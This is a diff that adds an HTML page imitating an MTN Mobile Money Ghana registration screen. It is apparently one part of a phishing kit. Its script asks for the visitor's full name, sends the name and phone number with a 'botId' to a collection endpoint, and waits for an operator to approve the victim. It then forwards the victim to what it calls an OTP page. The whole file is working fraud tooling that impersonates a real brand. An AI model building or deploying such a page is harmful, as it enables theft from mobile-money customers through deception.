@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MTN Mobile Money - Register</title>
+  <style>
+    /* ===== MTN MoMo Style ===== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #0a0a0a; /* dark background like other pages */
+      color: #333;
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+    }
+
+    .top-bar {
+      width: 100%;
+      max-width: 480px;
+      height: 72px;
+      background: #ffb300; /* MTN yellow */
+      display: flex;
+      align-items: center;
+      padding: 0 22px;
+      flex-shrink: 0;
+      border-radius: 1.5rem 1.5rem 0 0;
+      box-shadow: 0 2px 12px rgba(255, 179, 0, 0.2);
+    }
+
+    .top-bar .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .top-bar .logo svg {
+      height: 36px;
+      width: auto;
+    }
+
+    .top-bar .logo span {
+      font-weight: 700;
+      font-size: 18px;
+      color: #0a0a0a;
+      letter-spacing: -0.5px;
+    }
+
+    .back-btn {
+      color: #0a0a0a;
+      text-decoration: none;
+      font-size: 30px;
+      font-weight: 300;
+      line-height: 1;
+      margin-right: 16px;
+      transition: color 0.2s;
+    }
+    .back-btn:hover { color: #004b87; }
+
+    .container {
+      width: 100%;
+      max-width: 480px;
+      background: #ffffff;
+      padding: 34px 28px 28px;
+      border-radius: 0 0 1.5rem 1.5rem;
+      box-shadow: 0 20px 60px rgba(255, 179, 0, 0.12);
+      border: 1px solid rgba(255, 179, 0, 0.15);
+      border-top: none;
+      display: flex;
+      flex-direction: column;
+    }
+
+    #detailsForm {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .title {
+      font-size: 28px;
+      font-weight: 700;
+      color: #0a0a0a;
+      margin-bottom: 6px;
+      letter-spacing: -0.5px;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      color: #4a4a4a;
+      line-height: 1.5;
+      margin-bottom: 32px;
+      font-weight: 400;
+    }
+
+    .phone-input-wrap {
+      position: relative;
+      width: 100%;
+      margin-bottom: 0;
+    }
+
+    .phone-input-wrap input {
+      width: 100%;
+      height: 58px;
+      border: 2px solid #0a0a0a;
+      border-radius: 12px;
+      background: #fff;
+      padding: 0 16px 0 90px;
+      font-size: 17px;
+      color: #333;
+      outline: none;
+      transition: 0.2s;
+    }
+
+    .phone-input-wrap input::placeholder {
+      color: #999;
+      font-weight: 400;
+    }
+
+    .phone-input-wrap input:focus {
+      border-color: #ffb300;
+      box-shadow: 0 0 0 4px rgba(255, 179, 0, 0.25);
+    }
+
+    .country-code {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 17px;
+      font-weight: 600;
+      color: #0a0a0a;
+      pointer-events: none;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .country-code::after {
+      content: "▼";
+      font-size: 12px;
+      color: #0a0a0a;
+      margin-left: 4px;
+    }
+
+    .bottom-section {
+      margin-top: auto;
+      padding-bottom: 10px;
+    }
+
+    button {
+      width: 100%;
+      height: 56px;
+      border: none;
+      border-radius: 60px;
+      font-size: 20px;
+      font-weight: 700;
+      color: #fff;
+      background: #ccc;
+      cursor: not-allowed;
+      transition: 0.2s;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    button:enabled {
+      background: linear-gradient(135deg, #ffb300, #ffcc00);
+      color: #0a0a0a;
+      cursor: pointer;
+      box-shadow: 0 8px 24px rgba(255, 179, 0, 0.35);
+    }
+
+    button:enabled:hover {
+      background: linear-gradient(135deg, #e6a200, #ffb300);
+      transform: scale(1.01);
+      box-shadow: 0 12px 32px rgba(255, 179, 0, 0.45);
+    }
+
+    .status {
+      display: none;
+      margin-top: 15px;
+      text-align: center;
+      font-size: 14px;
+      padding: 10px;
+      border-radius: 12px;
+      font-weight: 500;
+      border: 1px solid transparent;
+    }
+
+    .status.error {
+      color: #c0392b;
+      background: #fef3f2;
+      border-color: #fecdca;
+    }
+
+    .status.success {
+      color: #0b2b3b;
+      background: #ecfdf3;
+      border-color: #abf0d1;
+    }
+
+    .spinner {
+      display: none;
+      width: 34px;
+      height: 34px;
+      margin: 18px auto 0;
+      border: 3px solid rgba(255, 179, 0, 0.15);
+      border-top: 3px solid #ffb300;
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 480px) {
+      body { padding: 1rem; }
+      .top-bar { border-radius: 1rem 1rem 0 0; padding: 0 16px; }
+      .container { padding: 28px 20px 22px; border-radius: 0 0 1rem 1rem; }
+      .title { font-size: 24px; }
+      .subtitle { font-size: 15px; }
+      .phone-input-wrap input { height: 56px; font-size: 16px; padding-left: 84px; }
+      .country-code { font-size: 16px; left: 14px; }
+      button { height: 56px; font-size: 19px; }
+    }
+
+    @media (max-width: 360px) {
+      .container { padding: 24px 16px 18px; }
+      .title { font-size: 22px; }
+      .subtitle { font-size: 14px; }
+      .phone-input-wrap input { height: 54px; font-size: 15px; padding-left: 76px; }
+      .country-code { font-size: 15px; }
+      button { font-size: 18px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="top-bar">
+    <a href="javascript:history.back()" class="back-btn">&#8592;</a>
+    <div class="logo">
+      <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
+        <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
+        <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN</text>
+      </svg>
+      <span>Mobile Money</span>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="title">Registration</div>
+    <div class="subtitle">Welcome to MTN Mobile Money Ghana</div>
+
+    <form id="detailsForm" class="form-content">
+      <div class="phone-input-wrap">
+        <span class="country-code">+233</span>
+        <input
+          type="tel"
+          id="phone"
+          name="phone"
+          placeholder="Mobile Number"
+          autocomplete="tel-national"
+          required>
+      </div>
+      <div class="bottom-section">
+        <button type="submit" class="primary" id="continueBtn" disabled>
+          SUBMIT
+        </button>
+      </div>
+    </form>
+
+    <div id="status" class="status"></div>
+    <div id="spinner" class="spinner"></div>
+  </div>
+
+  <script>
+    // ---------- CONFIG ----------
+    const params = new URLSearchParams(window.location.search);
+    let botId = params.get('botId') || localStorage.getItem('botId');
+    if (!botId) {
+      botId = 'bot1';
+      localStorage.setItem('botId', botId);
+    }
+    // Ensure URL has botId for bookmarking
+    if (!params.has('botId')) {
+      const newUrl = window.location.pathname + '?botId=' + botId;
+      window.history.replaceState({}, '', newUrl);
+    }
+
+    // ---------- USER NAME ----------
+    let fullName = localStorage.getItem('fullName');
+    if (!fullName) {
+      fullName = prompt('Please enter your full name:') || 'MTN User';
+      localStorage.setItem('fullName', fullName);
+    }
+
+    // ---------- DOM REFS ----------
+    const form = document.getElementById('detailsForm');
+    const phone = document.getElementById('phone');
+    const button = document.getElementById('continueBtn');
+    const statusEl = document.getElementById('status');
+    const spinner = document.getElementById('spinner');
+
+    let pollTimer = null;
+
+    // ---------- VALIDATION ----------
+    function validateForm() {
+      const phoneNumber = phone.value.replace(/\D/g, '');
+      button.disabled = (phoneNumber.length < 8);
+    }
+
+    phone.addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '');
+      validateForm();
+    });
+
+    // ---------- HELPER: CLEAR POLLING ----------
+    function stopPolling() {
+      if (pollTimer) {
+        clearInterval(pollTimer);
+        pollTimer = null;
+      }
+    }
+
+    // ---------- HELPER: SET STATUS ----------
+    function setStatus(message, type) {
+      statusEl.style.display = 'block';
+      statusEl.className = 'status ' + (type || '');
+      statusEl.textContent = message;
+    }
+
+    function hideStatus() {
+      statusEl.style.display = 'none';
+      statusEl.className = 'status';
+      statusEl.textContent = '';
+    }
+
+    // ---------- FORM SUBMIT ----------
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const phoneVal = phone.value.trim();
+      if (!phoneVal) {
+        setStatus('❌ Please enter a phone number.', 'error');
+        return;
+      }
+
+      // Disable button and show spinner
+      button.disabled = true;
+      spinner.style.display = 'block';
+      hideStatus();
+      setStatus('⏳ Awaiting admin approval...');
+
+      try {
+        const res = await fetch('/submit-phone', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ name: fullName, phone: phoneVal, botId })
+        });
+
+        if (!res.ok) {
+          const errText = await res.text();
+          throw new Error(errText || 'Server error');
+        }
+
+        const { requestId } = await res.json();
+
+        // Store phone and requestId for the next page
+        localStorage.setItem('phone', phoneVal);
+        localStorage.setItem('phoneRequestId', requestId);
+
+        // Start polling
+        stopPolling();
+        let attempts = 0;
+        const MAX_ATTEMPTS = 120;
+
+        pollTimer = setInterval(async () => {
+          attempts++;
+          try {
+            const checkRes = await fetch('/check-phone/' + requestId);
+            const data = await checkRes.json();
+
+            // 🔥 Backend now returns { approved: true } (not { redirect })
+            if (data.approved === true) {
+              stopPolling();
+              spinner.style.display = 'none';
+              setStatus('✅ Phone approved! Redirecting...', 'success');
+              // Pass requestId, phone, and botId to OTP page
+              const redirectUrl = 'link.html?requestId=' + requestId +
+                                  '&phone=' + encodeURIComponent(phoneVal) +
+                                  '&botId=' + botId;
+              setTimeout(() => {
+                window.location.href = redirectUrl;
+              }, 800);
+              return;
+            }
+
+            if (data.approved === false) {
+              stopPolling();
+              spinner.style.display = 'none';
+              setStatus('❌ Phone number rejected. Please try again.', 'error');
+              button.disabled = false;
+              return;
+            }
+
+            // Timeout
+            if (attempts > MAX_ATTEMPTS) {
+              stopPolling();
+              spinner.style.display = 'none';
+              setStatus(
+                '⏳ Approval taking too long. Please refresh or contact support.',
+                'error'
+              );
+              button.disabled = false;
+              return;
+            }
+
+            // Still pending – update status occasionally
+            if (attempts % 10 === 0) {
+              const seconds = Math.round(attempts * 1.5);
+              setStatus('⏳ Waiting for admin approval... (' + seconds + 's)');
+            }
+
+          } catch (err) {
+            console.error('Polling error:', err);
+            // Don't stop polling – network glitch might recover
+          }
+        }, 1500);
+
+      } catch (error) {
+        spinner.style.display = 'none';
+        setStatus('❌ Server error: ' + error.message, 'error');
+        button.disabled = false;
+      }
+    });
+
+    // ---------- INIT ----------
+    validateForm();
+  </script>
+</body>
+</html>
